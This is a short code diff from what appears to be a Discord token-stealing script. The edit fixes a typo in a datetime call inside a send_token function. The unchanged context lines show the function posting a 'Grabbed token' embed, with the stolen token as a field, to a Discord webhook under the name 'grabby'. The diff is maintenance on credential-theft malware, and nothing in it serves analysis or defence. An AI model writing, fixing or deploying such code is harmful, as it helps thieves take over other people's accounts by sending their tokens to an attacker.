@@ -23,7 +23,7 @@ def send_token(token):
     
     webhook = DiscordWebhook(url=webhook_url, username="grabby")
     
-    date_and_time = str(datetime.d  atetime.now())
+    date_and_time = str(datetime.datetime.now())
     embed = DiscordEmbed(title='Grabbed token', description=date_and_time, color='03b2f8')
     embed.set_timestamp()
     embed.add_embed_field(name='Token: ', value=token)
